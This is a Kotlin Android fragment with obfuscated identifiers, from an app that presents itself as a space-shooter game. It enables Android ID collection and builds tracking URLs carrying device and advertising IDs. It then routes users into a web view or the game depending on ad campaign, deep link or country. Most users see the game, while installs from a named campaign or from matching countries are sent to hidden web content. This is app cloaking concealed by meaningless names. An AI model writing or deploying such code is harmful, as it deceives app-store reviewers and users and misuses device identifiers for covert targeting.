package com.game.space.shooter2t.vffhtr

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.game.space.shooter2t.R
import com.game.space.shooter2t.Aosijasdj.Companion.qopskd
import com.game.space.shooter2t.Aosijasdj.Companion.fokfdij
import com.game.space.shooter2t.ncdswwe.Kioxizycgys
import com.game.space.shooter2t.zaswdw.Vdeoidoxzijc
import com.my.tracker.MyTracker
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class Teosiajdjsi : Fragment() {
    val aopsodkksod: SharedPreferences by inject(named("SharedPreferences"))
    private lateinit var ifjdjijidf: Context



    override fun onAttach(context: Context) {
        super.onAttach(context)
        ifjdjijidf = context
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val uxhcvjixc = "sub_id_5="
        val icxjvjixc = "naming"


        val qpwowkwoe = "com.game.space.shooter2t"
        val iozxci = "ad_id="
        val iocxjvvixc = "deviceID="

        val ovcji = aopsodkksod.getString("apps", null)
        val eiisjda = Build.VERSION.RELEASE
        val mivcjcv = aopsodkksod.getString("appCamp", null)

        val riodijs = "sub_id_1="

        val mxcijcxjixcjvhu = aopsodkksod.getString("deepSt", null)
        val eiojdijs = "deeporg"
        val eopkkwijd = "sub_id_4="

        val zozijxizj = aopsodkksod.getString("wv", null)
        val sijds = aopsodkksod.getString("countryDev", null)

        val zookzxjijxiz = aopsodkksod.getString("country", null)
        val riuhdus = "sub_id_6="



        val sooaskdisjjidsx = aopsodkksod.getString("mainId", null)
        val ivcjiv = Intent(activity, Kioxizycgys::class.java)


        val aopakskoa = aopsodkksod.getString(qopskd, null)


        val polssdj = MyTracker.getTrackerParams()
        polssdj.setCustomUserId(aopakskoa)

        val eiojisd = AppsFlyerLib.getInstance().getAppsFlyerUID(ifjdjijidf)
        val ossoasdksdoskad = Intent(activity, Vdeoidoxzijc::class.java)

        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        aopsodkksod.edit().putString(fokfdij, eiojisd).apply()

        val xjioc = "$zozijxizj$riodijs$mivcjcv&$iocxjvvixc$eiojisd&$iozxci$sooaskdisjjidsx&$eopkkwijd$qpwowkwoe&$uxhcvjixc$eiisjda&$riuhdus$icxjvjixc"
        val wios = "$zozijxizj$iocxjvvixc$aopakskoa&$iozxci$aopakskoa&$eopkkwijd$qpwowkwoe&$uxhcvjixc$eiisjda&$riuhdus$icxjvjixc"
        val kxzijzjizxjiizxj = "$zozijxizj$riodijs$mxcijcxjixcjvhu&$iocxjvvixc$eiojisd&$iozxci$sooaskdisjjidsx&$eopkkwijd$qpwowkwoe&$uxhcvjixc$eiisjda&$riuhdus$eiojdijs"
        val teuus = "$zozijxizj$riodijs$mxcijcxjixcjvhu&$iocxjvvixc$aopakskoa&$iozxci$aopakskoa&$eopkkwijd$qpwowkwoe&$uxhcvjixc$eiisjda&$riuhdus$eiojdijs"

        when(ovcji) {
            "1" ->
                if(mivcjcv!!.contains("tdb2")) {
                    aopsodkksod.edit().putString("link", xjioc).apply()
                    aopsodkksod.edit().putString("WebInt", "campaign").apply()
                    startActivity(ivcjiv)
                    activity?.finish()
                } else if (mxcijcxjixcjvhu!=null||sijds!!.contains(zookzxjijxiz.toString())) {

                    aopsodkksod.edit().putString("link", kxzijzjizxjiizxj).apply()
                    aopsodkksod.edit().putString("WebInt", "deepLink").apply()
                    startActivity(ivcjiv)
                    activity?.finish()
                } else {
                    startActivity(ossoasdksdoskad)
                    activity?.finish()
                }
            "0" ->
                if(mxcijcxjixcjvhu!=null) {
                    aopsodkksod.edit().putString("link", teuus).apply()
                    aopsodkksod.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(ivcjiv)
                    activity?.finish()
                } else if (sijds!!.contains(zookzxjijxiz.toString())) {
                    Log.d("WebTesting", wios)
                    aopsodkksod.edit().putString("link", wios).apply()
                    aopsodkksod.edit().putString("WebInt", "geo").apply()
                    startActivity(ivcjiv)
                    activity?.finish()
                } else {
                    startActivity(ossoasdksdoskad)
                    activity?.finish()
                }
        }
    }





    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.cvdoushs, container, false)
    }
}
